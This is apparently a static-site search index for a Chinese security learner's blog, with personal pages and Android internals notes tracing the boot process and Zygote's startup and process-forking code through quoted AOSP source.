{"config":{"lang":["zh","en"],"separator":"[\\s\\u200b\\-]","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u5f00\u7740\u843d\u7070\u6d85\u4f3d\u5c14\u5728\u514b\u9686\u8231\u4e2d\u745f\u745f\u53d1\u6296\u7684\u5b89\u5168\u4eba","text":""},{"location":"#_2","title":"\u6211\u662f","text":"<ul> <li>EVE online \u73a9\u5bb6[StabberORVexor]</li> <li>\u4fe1\u606f\u5b89\u5168-\u9006\u5411-\u5b89\u5353</li> </ul>"},{"location":"#_3","title":"\u8fd9\u91cc\u662f","text":"<ul> <li>\u8bb0\u5f55\u5b66\u4e60\u7b14\u8bb0</li> <li>\u5206\u4eab\u4e00\u4e9b\u6709\u8da3\u7684\u4e1c\u897f</li> <li>\u4ea4\u6d41\u6280\u672f\u5fc3\u5f97</li> <li>\u5076\u5c14\u6c34\u6c34\u751f\u6d3b</li> <li>\u4e00\u4e9b\u788e\u788e\u5ff5(\u6216\u8bb8)</li> </ul> <p>\u57fa\u4e8emkdocs-material</p> <p>mkdocs\u5b98\u65b9\u6587\u6863 mkdocs-material\u5b98\u65b9\u6587\u6863</p>"},{"location":"friends/","title":"\u53cb\u94fe","text":"<ul> <li> <p> YoSheep's \u5b66\u4e60\u7b14\u8bb0</p> </li> <li> <p> AlexYun's \u87e0\u6843\u5927\u4f1a</p> </li> <li> <p> Pwn\u270c\ufe0f\u67f3\u5927\u867e</p> </li> <li> <p> \u5976\u9f99</p> </li> <li> <p> la0d3ng/Wh1te_w0Od</p> </li> <li> <p> Xsheep</p> </li> </ul> <ul> <li> CAUC-CSA Wiki</li> </ul>"},{"location":"study/miscellaneous/","title":"\u6742\u8d27\u94fa","text":"<p>\u672c\u6587\u6863\u6536\u96c6\u4e00\u4e9b\u96f6\u6563\u7684\u77e5\u8bc6\u70b9</p>"},{"location":"study/android/theory/","title":"Android \u57fa\u7840\u77e5\u8bc6","text":"<p>\u672c\u6587\u6863\u6536\u96c6\u4e00\u4e9b\u7406\u8bba\u6027\u77e5\u8bc6\uff0c\u8f83\u4e3a\u96f6\u788e\uff0c\u4f46\u662f\u6700\u7ec8\u7f16\u7ec7\u6210\u4e00\u5f20\u5927\u7f51\u3002</p> <p>\u6700\u540e\u66f4\u65b0\u4e0e 2025-10-29 by N0rth5ea in CAUC</p> <p>\u5b9e\u8df5\u56fa\u7136\u80fd\u6781\u5feb\u7684\u83b7\u5f97\u6210\u5c31\u611f\uff0c\u4f46\u552f\u6709\u7406\u8bba\u7684\u79ef\u7d2f\u624d\u80fd\u8ba9\u4f60\u8d70\u5f97\u66f4\u8fdc\u3002</p>"},{"location":"study/android/theory/#android_1","title":"Android \u7cfb\u7edf\u5206\u5c42\u67b6\u6784\u4e0e\u542f\u52a8\u6d41\u7a0b","text":"\u53c2\u8003\u8d44\u6599 <ul> <li>Android\u542f\u52a8\u7cfb\u5217\u4e4b\u4e00\uff1ainit\u8fdb\u7a0b\u548cZygote\u8fdb\u7a0b</li> </ul> <p>\u76f8\u5173\u94fe\u63a5</p> <ul> <li>Zygote</li> <li>System Server</li> </ul> <p>Android \u662f\u4e00\u4e2a\u57fa\u4e8e Linux \u5185\u6838\u7684\u590d\u6742\u64cd\u4f5c\u7cfb\u7edf\u3002\u5176\u542f\u52a8\u8fc7\u7a0b\u662f\u4e00\u4e2a\u4ece\u786c\u4ef6\u52a0\u7535\u5230\u663e\u793a\u5e94\u7528\u754c\u9762\u7684\u5206\u5c42\u3001\u63a5\u529b\u8fc7\u7a0b\u3002</p>"},{"location":"study/android/theory/#1","title":"1. \u7cfb\u7edf\u542f\u52a8\u5c42","text":"<ul> <li> <p>Boot ROM (\u5f15\u5bfc\u53ea\u8bfb\u5b58\u50a8\u5668)</p> <ul> <li>\u5f53\u6309\u4e0b\u7535\u6e90\u952e\u65f6\uff0cCPU \u9996\u5148\u4f1a\u6267\u884c\u56fa\u5316\u5728 ROM \u4e2d\u7684\u4e00\u5c0f\u6bb5\u4ee3\u7801\u3002</li> <li>\u5b83\u4f1a\u8fdb\u884c\u57fa\u672c\u7684\u786c\u4ef6\u68c0\u67e5\uff0c\u7136\u540e\u627e\u5230\u5e76\u52a0\u8f7d\u4e0b\u4e00\u9636\u6bb5\u7684\u5f15\u5bfc\u7a0b\u5e8f\uff08Bootloader\uff09\u5230 RAM \u4e2d\u3002</li> </ul> </li> <li> <p>Bootloader (\u5f15\u5bfc\u52a0\u8f7d\u7a0b\u5e8f)</p> <ul> <li>Bootloader \u8d1f\u8d23\u521d\u59cb\u5316\u66f4\u591a\u7684\u786c\u4ef6\uff08\u5982\u5185\u5b58\u3001\u95ea\u5b58\uff09\u3002</li> <li>\u6700\u91cd\u8981\u7684\u662f\u5c06 Android \u7684\u6838\u5fc3Linux Kernel\u4ece\u95ea\u5b58\u52a0\u8f7d\u5230 RAM \u4e2d\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5185\u6838\u4ee3\u7801\u5f00\u59cb\u6267\u884c\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#2","title":"2. \u5185\u6838\u5c42","text":"<ul> <li>Linux Kernel (Linux \u5185\u6838)<ul> <li>\u8fd9\u662f Android \u7cfb\u7edf\u7684\u6838\u5fc3\u3002\u5185\u6838\u542f\u52a8\u540e\uff0c\u5b83\u4f1a\u63a5\u7ba1 CPU\uff0c\u5e76\u5f00\u59cb\u521d\u59cb\u5316\u5404\u79cd\u9a71\u52a8\u7a0b\u5e8f\uff08\u5982\u663e\u793a\u3001\u952e\u76d8\u3001Wi-Fi\uff09\u548c\u6838\u5fc3\u7cfb\u7edf\u529f\u80fd\uff08\u5982\u8fdb\u7a0b\u7ba1\u7406\u3001\u5185\u5b58\u7ba1\u7406\uff09\u3002</li> <li>\u5185\u6838\u542f\u52a8\u7684\u6700\u540e\u4e00\u6b65\uff0c\u662f\u5728\u7528\u6237\u7a7a\u95f4\uff08User Space\uff09\u4e2d\u542f\u52a8\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u5373 <code>init</code> \u8fdb\u7a0b\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#3-native-user-space","title":"3. \u539f\u751f\u7528\u6237\u7a7a\u95f4 (Native User Space)","text":"<ul> <li><code>init</code> \u8fdb\u7a0b<ul> <li><code>init</code> \u662f Android \u7cfb\u7edf\u4e2d\u7684\u7b2c\u4e00\u4e2a\u8fdb\u7a0b\uff08PID 1\uff09\uff0c\u662f\u6240\u6709\u5176\u4ed6\u7528\u6237\u7a7a\u95f4\u8fdb\u7a0b\u7684\u201c\u7956\u5148\u201d\u3002</li> <li>\u5b83\u4f1a\u89e3\u6790 <code>.rc</code> \u7ed3\u5c3e\u7684\u521d\u59cb\u5316\u811a\u672c\u6587\u4ef6\uff08\u4f8b\u5982 <code>init.rc</code>\uff09\u3002</li> <li>\u6839\u636e\u8fd9\u4e9b\u811a\u672c\uff0c<code>init</code> \u8fdb\u7a0b\u4f1a\u542f\u52a8\u7cfb\u7edf\u8fd0\u884c\u6240\u9700\u7684\u5404\u79cd\u539f\u751f\u670d\u52a1\uff08Daemons\uff09\uff0c\u4f8b\u5982 <code>logd</code> (\u65e5\u5fd7\u670d\u52a1)\u3001<code>vold</code> (\u5377\u7ba1\u7406\u670d\u52a1)\u7b49\u3002</li> <li>\u542f\u52a8\u4e86\u81f3\u5173\u91cd\u8981\u7684\u8fdb\u7a0b\uff1a<code>Zygote</code>\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#4-java-framework","title":"4. Java \u6846\u67b6\u5c42 (Framework)","text":"<ul> <li> <p><code>Zygote</code> (\u53d7\u7cbe\u5375) \u8fdb\u7a0b</p> <ul> <li>\u6838\u5fc3\u529f\u80fd\uff1a \u542f\u52a8 Java \u865a\u62df\u673a (JVM/ART)\uff0c\u9884\u52a0\u8f7d Android \u6846\u67b6\u7684\u6838\u5fc3 Java \u7c7b\u5e93\u548c\u7cfb\u7edf\u8d44\u6e90\u3002</li> <li>\u901a\u8fc7<code>fork</code>\u81ea\u8eab\u6765\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002\u7531\u4e8e\u6838\u5fc3\u7c7b\u5e93\u5df2\u9884\u52a0\u8f7d\uff0c\u53ef\u4ee5\u76f4\u63a5\u7ee7\u627f\u7ed9App\uff0c\u8fd9\u4f7f\u5f97 App \u7684\u542f\u52a8\u901f\u5ea6\u6781\u5feb\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u53c8\u79f0\u4e3a\u201c\u5b75\u5316\u201d\u3002</li> <li><code>Zygote</code> \u542f\u52a8\u540e\u9996\u5148\u4f1a\u5b75\u5316\u51fa <code>System Server</code> \u8fdb\u7a0b\u3002</li> </ul> </li> <li> <p><code>System Server</code> (\u7cfb\u7edf\u670d\u52a1\u8fdb\u7a0b)</p> <ul> <li><code>System Server</code> \u662f Android \u6846\u67b6\u7684\u6838\u5fc3\u3002\u8fd9\u662f\u7cfb\u7edf\u4e2d\u7b2c\u4e00\u4e2a\u8fd0\u884c\u7684 Java \u8fdb\u7a0b\u3002</li> <li>\u5b83\u8d1f\u8d23\u542f\u52a8\u548c\u7ba1\u7406\u6240\u6709\u6838\u5fc3\u7684\u7cfb\u7edf\u670d\u52a1\u3002</li> <li><code>System Server</code> \u542f\u52a8\u5b8c\u6210\u540e\uff0cAndroid \u7cfb\u7edf\u771f\u6b63\u201c\u51c6\u5907\u5c31\u7eea\u201d\uff0c\u5e76\u4f1a\u53d1\u9001 <code>BOOT_COMPLETED</code> \u5e7f\u64ad\uff0c\u540c\u65f6\u542f\u52a8 Launcher\uff08\u684c\u9762\u5e94\u7528\uff09\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#5-app","title":"5. \u5e94\u7528\u5c42 (App)","text":"<ul> <li>App (\u5e94\u7528\u7a0b\u5e8f) \u8fdb\u7a0b<ul> <li>\u5f53\u70b9\u51fb\u4e00\u4e2a\u5e94\u7528\u65f6\uff0cLauncher \u4f1a\u901a\u77e5 <code>Activity Manager Service</code> (\u5728 <code>System Server</code> \u8fdb\u7a0b\u4e2d)\u3002</li> <li><code>AMS</code> \u4f1a\u68c0\u67e5\u8be5\u5e94\u7528\u662f\u5426\u5df2\u6709\u8fdb\u7a0b\uff0c\u5982\u679c\u6ca1\u6709\uff0c\u5b83\u4f1a\u8bf7\u6c42 <code>Zygote</code> \u8fdb\u7a0b\u3002</li> <li><code>Zygote</code> \u6536\u5230\u8bf7\u6c42\u540e\uff0c\u4f1a\u5b75\u5316\u51fa\u4e00\u4e2a\u7ee7\u627f\u4e86 <code>Zygote</code> \u9884\u52a0\u8f7d\u7684\u865a\u62df\u673a\u548c\u6838\u5fc3\u8d44\u6e90\u7684\u5b50\u8fdb\u7a0b\uff0c\u5373\u4e3a\u8be5\u5e94\u7528\u8fdb\u7a0b\uff0c\u7136\u540e\u52a0\u8f7d\u5e94\u7528\u4ee3\u7801\uff0c\u542f\u52a8\u5e94\u7528\u7684 <code>Activity</code>\u3002</li> </ul> </li> </ul>"},{"location":"study/android/theory/#android_2","title":"Android \u7cfb\u7edf\u4ea4\u4e92\u673a\u5236","text":"<ul> <li> <p>SysCall (System Call - \u7cfb\u7edf\u8c03\u7528)</p> <ul> <li>\u8fd9\u662f\u7528\u6237\u7a7a\u95f4\uff08\u5305\u62ec <code>init</code>\u3001<code>Zygote</code>\u3001App\uff09\u4e0e Linux \u5185\u6838 \u4ea4\u4e92\u7684\u552f\u4e00\u6865\u6881\u3002</li> <li>\u5f53 App \u9700\u8981\u8bbf\u95ee\u786c\u4ef6\uff08\u5982\u8bfb\u5199\u6587\u4ef6\u3001\u6253\u5f00\u6444\u50cf\u5934\u3001\u53d1\u9001\u7f51\u7edc\u6570\u636e\uff09\u65f6\uff0c\u5b83\u4e0d\u80fd\u76f4\u63a5\u64cd\u4f5c\uff0c\u5fc5\u987b\u901a\u8fc7 SysCall \u5411\u5185\u6838\u53d1\u51fa\u8bf7\u6c42\uff0c\u7531\u5185\u6838\u4ee3\u4e3a\u5b8c\u6210\uff0c\u4ee5\u4fdd\u8bc1\u7cfb\u7edf\u5b89\u5168\u548c\u7a33\u5b9a\u3002</li> </ul> </li> <li> <p>JNI (Java Native Interface - Java \u672c\u5730\u63a5\u53e3)</p> <ul> <li>\u8fd9\u662f Android \u4e2d Java \u4ee3\u7801\u4e0e C/C++\uff08Native\uff09\u4ee3\u7801\u4ea4\u4e92\u7684\u6865\u6881\u3002</li> <li>Android \u7684\u6846\u67b6\u5c42\uff08\u5982 <code>System Server</code>\uff09\u548c\u5e94\u7528\uff08App\uff09\u4e3b\u8981\u662f\u7528 Java \u7f16\u5199\u7684\uff0c\u4f46\u5b83\u4eec\u9700\u8981\u8c03\u7528\u5e95\u5c42\u7684\u7cfb\u7edf\u529f\u80fd\uff08\u4f8b\u5982\u56fe\u5f62\u6e32\u67d3\u3001\u786c\u4ef6\u8bbf\u95ee\uff09\uff0c\u8fd9\u4e9b\u529f\u80fd\u901a\u5e38\u7531 C/C++ \u5b9e\u73b0\u3002</li> <li>\u6d41\u7a0b\uff1a Java \u4ee3\u7801 (App) \u2192 JNI \u2192 C/C++ (Native \u5e93) \u2192 SysCall \u2192 Linux \u5185\u6838\u3002</li> </ul> </li> <li> <p>Binder (\u8fdb\u7a0b\u95f4\u901a\u4fe1)</p> <ul> <li>\u8fd9\u662f Android \u7279\u6709\u7684\u9ad8\u6027\u80fd\u8fdb\u7a0b\u95f4\u901a\u4fe1\uff08IPC\uff09\u673a\u5236\u3002</li> <li>\u5b83\u5728 Android \u4e2d\u65e0\u5904\u4e0d\u5728\uff1a<ul> <li>App \u4e0e <code>System Server</code>\uff08AMS, PMS \u7b49\uff09\u4e4b\u95f4\u7684\u901a\u4fe1\u3002</li> <li>App \u4e0e App \u4e4b\u95f4\u7684\u901a\u4fe1\u3002</li> </ul> </li> </ul> </li> </ul>"},{"location":"study/android/theory/#zygote","title":"Zygote","text":"\u53c2\u8003\u8d44\u6599 <ul> <li>Zygote \u8fdb\u7a0b\u7b80\u4ecb</li> <li>\u8c08\u8c08\u5bf9Android\u4e2dZygote\u7684\u7406\u89e3</li> <li>Android\u542f\u52a8\u7cfb\u5217\u4e4b\u4e00\uff1ainit\u8fdb\u7a0b\u548cZygote\u8fdb\u7a0b</li> <li>Android 9.0.0_r45 \u6e90\u7801\u5206\u6790</li> <li>zygote \u8fdb\u7a0b\u542f\u52a8\u5206\u6790\u4e00</li> <li>AOSPXRef</li> <li>google source fork.cpp</li> </ul> <p>\u76f8\u5173\u94fe\u63a5</p> <ul> <li>Android \u542f\u52a8\u6d41\u7a0b</li> <li>Xposed</li> <li>System Server</li> </ul> <p>\u5728 Android \u542f\u52a8\u6d41\u7a0b\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u7b80\u8981\u4ecb\u7ecd\u4e86 Zygote \u8fdb\u7a0b\u7684\u4f5c\u7528\u3002\u5927\u540d\u9f0e\u9f0e\u7684 Xposed \u6846\u67b6\u6b63\u662f\u901a\u8fc7 Hook Zygote \u6765\u5b9e\u73b0\u5bf9\u6240\u6709 App \u7684\u4ee3\u7801\u6ce8\u5165\u3002 \u56e0\u6b64\u6211\u4eec\u6765\u4ece\u4ee3\u7801\u4ed4\u7ec6\u6df1\u5165\u4e86\u89e3\u4e0b Zygote \u7684\u5de5\u4f5c\u539f\u7406\u3002</p> <p>\u65e0\u7279\u6b8a\u8bf4\u660e\uff0c\u4ee5\u4e0b\u6e90\u7801\u5747\u57fa\u4e8e Android 16.0.0_r2 \u6e90\u7801 \u5206\u6790</p>"},{"location":"study/android/theory/#zygote_1","title":"Zygote \u542f\u52a8\u6d41\u7a0b","text":""},{"location":"study/android/theory/#1-init-app_process","title":"1. init \u8fdb\u7a0b\u542f\u52a8 app_process","text":"<p>\u6309\u7167\u6211\u4eec\u4e4b\u524d\u7684\u4ecb\u7ecd\uff0cZygote \u662f\u7531 init \u8fdb\u7a0b\u542f\u52a8\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5728 init.rc \u4e2d\u627e\u5230\u5bf9\u5e94\u542f\u52a8\uff1a</p> <p>/system/core/rootdir/init.rc<pre><code>#line 526:528\n    # Now we can start zygote.\n    trigger zygote-start\n\n#line 1087:1095\n# to start-zygote in device's init.rc to unblock zygote start.\non zygote-start\n    wait_for_prop odsign.verification.done 1\n    # A/B update verifier that marks a successful boot.\n    exec_start update_verifier\n    start statsd\n    start zygote\n    start zygote_secondary\n</code></pre> \u7cfb\u7edf\u4f1a\u542f\u52a8 zygote \u548c zygote_secondary \u670d\u52a1\u3002\u8fd9\u4e24\u4e2a\u670d\u52a1\u58f0\u660e\u4e8e\u4ee5\u4e0b\u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a </p> init.zygote32init.zygote64init.zygote64_secondary /system/core/rootdir/init.zygote32.rc<pre><code>service zygote /system/bin/app_process -Xzygote /system/bin --zygote --start-system-server\n    class main\n    priority -20\n    user root\n    group root readproc reserved_disk\n    socket zygote stream 660 root system\n    socket usap_pool_primary stream 660 root system\n    onrestart exec_background - system system -- /system/bin/vdc volume abort_fuse\n    onrestart write /sys/power/state on\n    # NOTE: If the wakelock name here is changed, then also\n    # update it in SystemSuspend.cpp\n    onrestart write /sys/power/wake_lock zygote_kwl\n    onrestart restart audioserver\n    onrestart restart cameraserver\n    onrestart restart media\n    onrestart restart --only-if-running media.tuner\n    onrestart restart netd\n    onrestart restart wificond\n    task_profiles ProcessCapacityHigh MaxPerformance\n    critical window=${zygote.critical_window.minute:-off} target=zygote-fatal\n</code></pre> /system/core/rootdir/init.zygote64.rc<pre><code>service zygote /system/bin/app_process64 -Xzygote /system/bin --zygote --start-system-server --socket-name=zygote\n    class main\n    priority -20\n    user root\n    group root readproc reserved_disk\n    socket zygote stream 660 root system\n    socket usap_pool_primary stream 660 root system\n    onrestart exec_background - system system -- /system/bin/vdc volume abort_fuse\n    onrestart write /sys/power/state on\n    # NOTE: If the wakelock name here is changed, then also\n    # update it in SystemSuspend.cpp\n    onrestart write /sys/power/wake_lock zygote_kwl\n    onrestart restart audioserver\n    onrestart restart cameraserver\n    onrestart restart media\n    onrestart restart --only-if-running media.tuner\n    onrestart restart netd\n    onrestart restart wificond\n    task_profiles ProcessCapacityHigh MaxPerformance\n    critical window=${zygote.critical_window.minute:-off} target=zygote-fatal\n</code></pre> /system/core/rootdir/init.zygote64_32.rc<pre><code>import /system/etc/init/hw/init.zygote64.rc\n\nservice zygote_secondary /system/bin/app_process32 -Xzygote /system/bin --zygote --socket-name=zygote_secondary --enable-lazy-preload\n    class main\n    priority -20\n    user root\n    group root readproc reserved_disk\n    socket zygote_secondary stream 660 root system\n    socket usap_pool_secondary stream 660 root system\n    onrestart restart zygote\n    task_profiles ProcessCapacityHigh MaxPerformance\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\uff0czygote \u670d\u52a1\u4f1a\u542f\u52a8 <code>/system/bin/app_process(64)</code> \u8fdb\u7a0b\uff0c\u9644\u5e26\u7684\u53c2\u6570\u662f<code>--zygote --start-system-server</code>\u3002</p>"},{"location":"study/android/theory/#2-app_process-zygoteinit","title":"2. app_process \u542f\u52a8 ZygoteInit","text":"\u6e90\u7801\u7f51\u7ad9\u4e0a\u5e76\u6ca1\u6709\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6211\u4ece Android 9 \u7684\u5b9e\u4f53\u673a\u4e2d\u63d0\u53d6\u4e86\u8fd9\u4e2a\u6587\u4ef6\uff0c\u662f\u4e00\u4e2a ELF \u6587\u4ef6\uff0cIDA \u542f\u52a8\u3002 <p>/system/bin/app_process64 main()<pre><code>  if ( (v55 &amp; 0x100000000LL) != 0 )\n  {\n    p_com.android.internal.os.RuntimeInit = \"com.android.internal.os.ZygoteInit\";\n    v42 = 1;\n  }\n  // ...\n  android::AndroidRuntime::start(v61, p_com.android.internal.os.RuntimeInit, v58, v42);\n</code></pre> \u5728\u7ecf\u8fc7\u4e00\u7cfb\u5217\u53c2\u6570\u6bd4\u5bf9\u540e\uff0c\u542f\u52a8\u4e86java\u5c42<code>com.android.internal.os.ZygoteInit</code>\u3002</p> <p>app_process \u5bf9\u5e94\u7684\u6e90\u7801\u662f app_main.cpp /frameworks/base/cmds/app_process/app_main.cpp<pre><code>    ++i;  // Skip unused \"parent dir\" argument.\n    while (i &lt; argc) {\n        const char* arg = argv[i++];\n        if (strcmp(arg, \"--zygote\") == 0) {\n            zygote = true;\n            niceName = ZYGOTE_NICE_NAME;\n        } else if (strcmp(arg, \"--start-system-server\") == 0) {\n            startSystemServer = true;\n        } else if (strcmp(arg, \"--application\") == 0) {\n            application = true;\n        } else if (strncmp(arg, \"--nice-name=\", 12) == 0) {\n            niceName = (arg + 12);\n        } else if (strncmp(arg, \"--\", 2) != 0) {\n            className = arg;\n            break;\n        } else {\n            --i;\n            break;\n        }\n    }\n//...\n        if (startSystemServer) {\n            args.add(String8(\"start-system-server\"));\n        }\n//...\n    if (zygote) {\n        runtime.start(\"com.android.internal.os.ZygoteInit\", args, zygote);\n    } else if (!className.empty()) {\n        runtime.start(\"com.android.internal.os.RuntimeInit\", args, zygote);\n    } else {\n        fprintf(stderr, \"Error: no class name or --zygote supplied.\\n\");\n        app_usage();\n        LOG_ALWAYS_FATAL(\"app_process: no class name or --zygote supplied.\");\n    }\n</code></pre></p> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u5728<code>--zygote --start-system-server</code>\u53c2\u6570\u4e0b\uff0c\u6700\u7ec8\u4f1a\u542f\u52a8Java\u5c42\u7684 <code>com.android.internal.os.ZygoteInit</code> \u7c7b\uff0c\u5e76\u5c06<code>start-system-server</code>\u653e\u5728arg\u4e2d\u4f20\u5165\u3002</p>"},{"location":"study/android/theory/#_1","title":"\u5e94\u7528\u8fdb\u7a0b\u5b75\u5316\u6d41\u7a0b","text":""},{"location":"study/android/theory/#1-zygoteinit","title":"1. ZygoteInit\uff1a\u627f\u4e0a\u542f\u4e0b","text":"<p>\u6211\u4eec\u56de\u5230Android 16.0.0_r2\u6e90\u7801\u4e2d\u67e5\u770b\u8fd9\u4e2a\u7c7b\uff1a</p> /frameworks/base/core/java/com/android/internal/os/ZygoteInit.java<pre><code>// \u68c0\u67e5\u53c2\u6570 line 848:860\n            for (int i = 1; i &lt; argv.length; i++) {\n                if (\"start-system-server\".equals(argv[i])) {\n                    startSystemServer = true;\n                } else if (\"--enable-lazy-preload\".equals(argv[i])) {\n                    enableLazyPreload = true;\n                } else if (argv[i].startsWith(ABI_LIST_ARG)) {\n                    abiList = argv[i].substring(ABI_LIST_ARG.length());\n                } else if (argv[i].startsWith(SOCKET_NAME_ARG)) {\n                    zygoteSocketName = argv[i].substring(SOCKET_NAME_ARG.length());\n                } else {\n                    throw new RuntimeException(\"Unknown command line argument: \" + argv[i]);\n                }\n            }\n// \u9884\u52a0\u8f7d\u8d44\u6e90\u4f9b\u540e\u7eed\u5b75\u5316\u7528 line 879:889\n            // In some configurations, we avoid preloading resources and classes eagerly.\n            // In such cases, we will preload things prior to our first fork.\n            if (!enableLazyPreload) {\n                bootTimingsTraceLog.traceBegin(\"ZygotePreload\");\n                EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_START,\n                        SystemClock.uptimeMillis());\n                preload(bootTimingsTraceLog);\n                EventLog.writeEvent(LOG_BOOT_PROGRESS_PRELOAD_END,\n                        SystemClock.uptimeMillis());\n                bootTimingsTraceLog.traceEnd(); // ZygotePreload\n            }\n// \u5b75\u5316 SystemServer line 984:913\n            if (startSystemServer) {\n                Runnable r = forkSystemServer(abiList, zygoteSocketName, zygoteServer);\n\n                // {@code r == null} in the parent (zygote) process, and {@code r != null} in the\n                // child (system_server) process.\n                if (r != null) {\n                    r.run();\n                    return;\n                }\n            }\n// \u5faa\u73af\u7b49\u5f85\u521b\u5efa\u8bf7\u6c42 line 917:919\n            // The select loop returns early in the child process after a fork and\n            // loops forever in the zygote.\n            caller = zygoteServer.runSelectLoop(abiList);\n</code></pre> <p><code>ZygoteInit</code> \u5728\u5b8c\u6210\u9884\u52a0\u8f7d\u3001\u5b75\u5316 <code>SystemServer</code> \u540e\uff0c\u4f1a\u901a\u8fc7 <code>zygoteServer.runSelectLoop</code> \u65b9\u6cd5\u542f\u52a8\u4e00\u4e2a\u5faa\u73af\uff0c\u6301\u7eed\u76d1\u542c\u6765\u81ea <code>AMS</code> \u7684\u521b\u5efa\u65b0\u5e94\u7528\u8fdb\u7a0b\u7684\u8bf7\u6c42\u3002</p>"},{"location":"study/android/theory/#2-java-fork","title":"2. Java \u5c42\uff1a\u8bf7\u6c42\u5904\u7406\u4e0e Fork","text":"<p>\u5f53 <code>Zygote</code> \u6536\u5230\u65b0\u8fdb\u7a0b\u521b\u5efa\u8bf7\u6c42\u65f6\uff0c\u5904\u7406\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <ol> <li> <p><code>ZygoteServer</code> \u76d1\u542c\u8bf7\u6c42 <code>runSelectLoop</code> \u65b9\u6cd5\u8d1f\u8d23\u76d1\u542c\u548c\u7ba1\u7406\u8bf7\u6c42\uff0c\u5e76\u5c06\u5177\u4f53\u7684\u5904\u7406\u5de5\u4f5c\u4ea4\u7ed9 <code>ZygoteConnection</code>\u3002     /frameworks/base/core/java/com/android/internal/os/ZygoteServer.java<pre><code>// runSelectLoop \u65b9\u6cd5 line 508:521\n                    if (pollIndex == 0) {\n                        // Zygote server socket\n                        ZygoteConnection newPeer = acceptCommandPeer(abiList);\n                        peers.add(newPeer);\n                        socketFDs.add(newPeer.getFileDescriptor());\n                    } else if (pollIndex &lt; usapPoolEventFDIndex) {\n                        // Session socket accepted from the Zygote server socket\n\n                        try {\n                            ZygoteConnection connection = peers.get(pollIndex);\n                            boolean multipleForksOK = !isUsapPoolEnabled()\n                                    &amp;&amp; ZygoteHooks.isIndefiniteThreadSuspensionSafe();\n                            final Runnable command =\n                                    connection.processCommand(this, multipleForksOK);\n</code></pre></p> </li> <li> <p><code>ZygoteConnection</code> \u5904\u7406\u8fde\u63a5 <code>ZygoteConnection</code> \u8d1f\u8d23\u89e3\u6790\u8bf7\u6c42\u53c2\u6570\uff0c\u5e76\u8c03\u7528 <code>Zygote.forkAndSpecialize</code> \u6765\u6267\u884c <code>fork</code> \u64cd\u4f5c\u3002     /frameworks/base/core/java/com/android/internal/os/ZygoteConnection.java<pre><code>// \u53ef\u4ee5\u770b\u5230\u8c03\u7528 Native \u5c42\u7684 fork \u903b\u8f91 line 234:237\n        pid = Zygote.forkAndSpecialize(parsedArgs.uid, parsedArgs.gid, parsedArgs.gids,\n                parsedArgs.runtimeFlags, rlimits, parsedArgs.mountExternal, parsedArgs.seInfo,\n                parsedArgs.niceName, fdsToClose, fdsToIgnore, parsedArgs.startChildZygote,\n                parsedArgs.instructionSet, parsedArgs.appDataDir);\n</code></pre></p> </li> <li> <p><code>Zygote</code> \u6267\u884c Fork <code>forkAndSpecialize</code> \u65b9\u6cd5\u4f1a\u8c03\u7528 <code>native</code> \u65b9\u6cd5 <code>nativeForkAndSpecialize</code> \u6765\u771f\u6b63\u6267\u884c <code>fork</code>\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5bf9\u6bd4\u4e00\u4e0b\u5b75\u5316\u666e\u901a\u5e94\u7528\u8fdb\u7a0b (<code>forkAndSpecialize</code>) \u548c\u5b75\u5316 <code>SystemServer</code> (<code>forkSystemServer</code>) \u7684\u4ee3\u7801\uff0c\u5b83\u4eec\u6700\u7ec8\u90fd\u4f9d\u8d56 <code>native</code> \u65b9\u6cd5\u3002</p> forkAndSpecialize (\u5e94\u7528\u8fdb\u7a0b)forkSystemServer (\u7cfb\u7edf\u670d\u52a1) /frameworks/base/core/java/com/android/internal/os/Zygote.java<pre><code>// line 368:403\n    static int forkAndSpecialize(int uid, int gid, int[] gids, int runtimeFlags,\n            int[][] rlimits, int mountExternal, String seInfo, String niceName, int[] fdsToClose,\n            int[] fdsToIgnore, boolean startChildZygote, String instructionSet, String appDataDir,\n            boolean isTopApp, String[] pkgDataInfoList, String[] allowlistedDataInfoList,\n            boolean bindMountAppDataDirs, boolean bindMountAppStorageDirs,\n            boolean bindMountSyspropOverrides) {\n        ZygoteHooks.preFork();\n\n        int pid = nativeForkAndSpecialize(\n                uid, gid, gids, runtimeFlags, rlimits, mountExternal, seInfo, niceName, fdsToClose,\n                fdsToIgnore, startChildZygote, instructionSet, appDataDir, isTopApp,\n                pkgDataInfoList, allowlistedDataInfoList, bindMountAppDataDirs,\n                bindMountAppStorageDirs, bindMountSyspropOverrides);\n        if (pid == 0) {\n            // Note that this event ends at the end of handleChildProc,\n            Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, \"PostFork\");\n\n            // If no GIDs were specified, don't make any permissions changes based on groups.\n            if (gids != null &amp;&amp; gids.length &gt; 0) {\n                NetworkUtilsInternal.setAllowNetworkingForProcess(containsInetGid(gids));\n            }\n        }\n\n        // Set the Java Language thread priority to the default value for new apps.\n        Thread.currentThread().setPriority(Thread.NORM_PRIORITY);\n\n        ZygoteHooks.postForkCommon();\n        return pid;\n    }\n\n    private static native int nativeForkAndSpecialize(int uid, int gid, int[] gids,\n            int runtimeFlags, int[][] rlimits, int mountExternal, String seInfo, String niceName,\n            int[] fdsToClose, int[] fdsToIgnore, boolean startChildZygote, String instructionSet,\n            String appDataDir, boolean isTopApp, String[] pkgDataInfoList,\n            String[] allowlistedDataInfoList, boolean bindMountAppDataDirs,\n            boolean bindMountAppStorageDirs, boolean bindMountSyspropOverrides);\n</code></pre> /frameworks/base/core/java/com/android/internal/os/Zygote.java<pre><code>// line 501:517\n    static int forkSystemServer(int uid, int gid, int[] gids, int 